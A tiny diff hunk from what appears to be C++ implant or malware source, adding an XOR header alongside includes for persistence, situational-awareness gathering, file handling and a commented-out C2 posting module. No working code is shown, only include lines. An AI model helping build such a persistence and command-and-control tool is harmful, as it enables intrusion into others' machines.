@@ -22,6 +22,7 @@ using json = nlohmann::json;
 #include "../persist/persist.h"
 #include "../situational_awareness/GatherInfo.h"
 #include "../file/file.h"
+#include "../xor/xor.h"
 //#include "../sendtoc2/Post.h"
 
 /* Variables */
